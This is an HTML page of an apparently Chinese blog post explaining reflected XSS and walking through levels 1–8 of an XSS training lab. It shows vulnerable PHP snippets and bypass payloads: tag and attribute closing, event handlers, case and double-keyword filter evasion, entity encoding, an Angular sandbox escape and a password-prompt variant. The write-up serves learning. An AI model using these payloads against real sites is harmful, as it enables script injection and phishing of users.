@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="yanm1ng&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      基础反射型xss | Hexo
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+  
+    
+<script src="/js/local-search.js"></script>
+
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>Hexo</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/series/" class="item-link">Series</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+      
+        <li class="menu-item menu-item-search right-list">
+    <a role="button" class="popup-trigger">
+        <i class="fa fa-search fa-fw"></i>
+    </a>
+</li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/series/" class="menu-link">Series</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+    
+      <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+            <span class="search-icon">
+                <i class="fa fa-search"></i>
+            </span>
+            <div class="search-input-container">
+                <input autocomplete="off" autocapitalize="off"
+                    placeholder="Please enter your keyword(s) to search." spellcheck="false"
+                    type="search" class="search-input">
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa fa-times-circle"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+    
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>基础反射型xss</h2>
+  <p class="post-date">2022-04-21</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p>花了一周时间简单了解了一下xss的基本原理和插入方法，由于xss个人平台搭建好后项目出了点差错，只能整理出关于反射性xss的相关内容。</p>
+<span id="more"></span>
+<h2 id="XSS-漏洞简介">XSS 漏洞简介</h2>
+<p><a target="_blank" rel="noopener" href="http://localhost/install/step2.php">Permeate渗透测试系统 XSS管理平台</a></p>
+<p>跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。<br>
+xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong>。<br>
+常见的输出函数有： <code>echo printf print print_r sprintf die var-dump var_export</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getQueryVariable</span><br></pre></td></tr></table></figure>
+<p>基础模型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="XSS验证沙箱逃逸">XSS验证沙箱逃逸</h3>
+<p>Angular JS沙箱逃逸，从Angular1.6及以后版本,Angular沙箱已被删除。</p>
+<p>Angular(版本小于1.6)内的典型XSS payload如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;8*9&#125;&#125; // 如果存在沙箱逃逸，会回显72</span><br></pre></td></tr></table></figure>
+<p>Angular(版本号v1.4.0-v1.4.9)沙箱逃逸。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;$eval(&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;);&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>JavaScript函数替换“alert(1)”,例如，我们可以使用以下payload创建提示，要求输入密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;$eval(&#x27;x=1&#125; &#125; &#125;;prompt(&quot;Please enter your password:&quot;)//&#x27;);&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/milantgh/p/3764411.html">PHP ini_set() 函数</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Yoo_666/article/details/107319239">PHP htmlspecialchars() 函数</a></p>
+<p>把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体</p>
+<p>htmlspecialchars和htmlentities的区别：<br>
+htmlspecialchars 只转义 <code>&amp; 、&quot; 、' 、&lt; 、&gt;</code> 这几个html代码，而 htmlentities 却会转化所有的html代码，连同里面的它无法识别的中文字符也会转化。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;：转换为&amp;amp;</span><br><span class="line">&quot;：转换为&amp;quot;</span><br><span class="line">&#x27;：转换为成为 &#x27;</span><br><span class="line">&lt;：转换为&amp;lt;</span><br><span class="line">&gt;：转换为&amp;gt;</span><br></pre></td></tr></table></figure>
+<h3 id="XSS常见的触发标签">XSS常见的触发标签</h3>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116462782">(32条消息) XSS常见的触发标签_H3rmesk1t的博客-CSDN博客_xss标签</a></p>
+<p><strong><code>a</code>标签：生成链接</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(&#x27;xss&#x27;)&gt;xss&lt;/a&gt;</span><br><span class="line">&quot;&gt; &lt;a href=javascript:alert(&#x27;xss&#x27;) &gt; xss&lt;/a&gt; //  #htmlspecialchars()函数及过滤部分符号时使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong><code>img</code>标签：图片加载错误时触发</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img  src=1  οnerrοr=alert(&quot;xss&quot;)&gt;</span><br><span class="line">&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie</span><br><span class="line">不需要闭合</span><br></pre></td></tr></table></figure>
+<p><strong><code>input</code>标签：焦点竞争</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&#x27;onfocus=javascript:alert(&#x27;xss&#x27;) &gt; //  #闭合方式1</span><br><span class="line">&quot;onfocus=javascript:alert(&#x27;xss&#x27;) &quot;    #闭合方式2</span><br></pre></td></tr></table></figure>
+<p><strong>data字符</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=</span><br><span class="line">作用的等同于 javascript:alert(&quot;xss&quot;)或&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>iframe标签：标记一个内联框架</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=javascript:alert(&#x27;xss&#x27;)&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="level1">level1</h4>
+<p>考察基础的xss语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="level2">level2</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">分析：&lt;h2&gt;标签用htmlspecialchars()进行了处理</span><br></pre></td></tr></table></figure>
+<p>被转义：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;  ==&gt;  &amp;lt;script&amp;gt;alert(&#x27;xss&#x27;)&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure>
+<p>解法：将属性的引号和标签闭合。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;//</span><br></pre></td></tr></table></figure>
+<p>左边的&quot;&gt;去闭合原先的&quot; ，右边的//去注释原先的&quot;&gt;</p>
+<h4 id="level3">level3</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">分析：&lt;h2&gt;标签和value都用htmlspecialchars()进行了处理，考察的就是对xss常见触发标签的理解</span><br></pre></td></tr></table></figure>
+<p>被转义：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;//  ==&gt;  &amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#x27;xss&#x27;)&amp;lt;/script&amp;gt;//</span><br></pre></td></tr></table></figure>
+<p>可见level2的方法不适用，可触发htmlspecialchars()函数的符号都会被转义。</p>
+<p>解法： 通过<code>input</code>标签的一些特殊事件来执行js代码 。</p>
+<p>input各种事件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">onfocus  当input获取到焦点时触发</span><br><span class="line">onblur  当input失去焦点时触发，注意：这个事件触发的前提是已经获取了焦点再失去焦点的时候才会触发该事件，用于判断标签为空</span><br><span class="line">onchange 当input失去焦点并且它的value值发生变化时触发</span><br><span class="line">onkeydown 按下按键时的事件触发</span><br><span class="line">onkeyup 当按键抬起的时候触发的事件，在该事件触发之前一定触发了onkeydown事件--相当于一个按键，两个事件</span><br><span class="line">onclick  主要是用于 input type=button，input作为一个按钮使用时的鼠标点击事件</span><br><span class="line">onselect  当input里的内容文本被选中后执行，只要选择了就会触发，不是全部选中</span><br><span class="line">oninput  当input的value值发生变化时就会触发，（与onchange的区别是不用等到失去焦点就可以触发了）</span><br><span class="line">onmousemove 将鼠标指针移到 &lt;div&gt; 元素上时执行 JavaScript</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onfocus=javascript:alert(&#x27;xss&#x27;) &gt; //</span><br></pre></td></tr></table></figure>
+<p>由于 <strong>onfocus事件的特殊性</strong> ，需要在点击搜索框。</p>
+<h4 id="level4">level4</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level4.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>输入<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，CTRL+U：</p>
+<p><img src="/2022/04/21/%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/c.png" alt></p>
+<p>h2标签的转义和前相同，需要注意value中删掉了<code>&lt;</code>和<code>&gt;</code>，但是这对我们使用input事件触发不需要用到这两个符号，不过需要改一下闭合的方式。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onfocus=javascript:alert(&#x27;xss&#x27;) &quot;</span><br></pre></td></tr></table></figure>
+<h4 id="level5">level5</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level5.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>注意源码的5、6行利用str_replace函数替换，使得<code>&lt;script&gt;</code>和onfocus事件都不能使用了。</p>
+<p><img src="/2022/04/21/%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/cv.png" alt></p>
+<p>所以想到替换成其他的标签。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=javascript:alert(&#x27;xss&#x27;) &gt; xss&lt;/a&gt; //</span><br></pre></td></tr></table></figure>
+<p>点击链接即可。</p>
+<h4 id="level6">level6</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level6.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>主要关注str_replace()函数，由于源码中不区分大小写，可以尝试使用大小写绕过。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a HrEF=javascript:alert(&#x27;xss&#x27;) &gt; xss&lt;/a&gt; //</span><br></pre></td></tr></table></figure>
+<h4 id="level7">level7</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str =strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level7.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>发现是直接将script、on、src等替换为空，那么既然考察了大小写绕过，那么双写关键字也一定不能少（有sql那味了），那就不需要尝试新的标签。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a hhrefref=javascscriptript:alert(&#x27;xss&#x27;) &gt; xss&lt;/a&gt; //</span><br><span class="line">&quot;oonnfocus=javascscriptript:alert(&#x27;xss&#x27;) &quot;</span><br></pre></td></tr></table></figure>
+<h4 id="level8">level8</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level8.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>从源码的后半段看出本题与之前的不太一样，在尝试在搜索框插入xss，看其源码：</p>
+<p><img src="/2022/04/21/%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/y.png" alt></p>
+<p>所以我们是将xss插入到友情链接中，即  <code>&lt;a&gt;</code>标签的href属性值中，再者还要注意的是<code>&quot;</code>会被转义为<code>&amp;quot</code>，所以我们应该注意闭合的方式。想到用input焦点事件结合双写关键字的方法，发现不行。。</p>
+<p><img src="/2022/04/21/%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/haa.png" alt></p>
+<p>并且存在很多问题，首先就是双写没办法绕过，并且这里是href就是要我们补充js代码，所以应该对<code>javascript:alert('xss')</code>下文章，因为a的头尾标签都有了，链接的字眼也有，所以其他部分就不需要，采取转义的方式，<strong>转化为HTML实体</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(&#x27;xss&#x27;)</span><br><span class="line">转为&amp;#xxxx</span><br><span class="line">&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0027;&amp;#x0078;&amp;#x0073;&amp;#x0073;&amp;#x0027;&amp;#x0029;</span><br><span class="line">先转为Unicode，再转为ASCII</span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;</span><br></pre></td></tr></table></figure>
+<h4 id="level9">level9</h4>
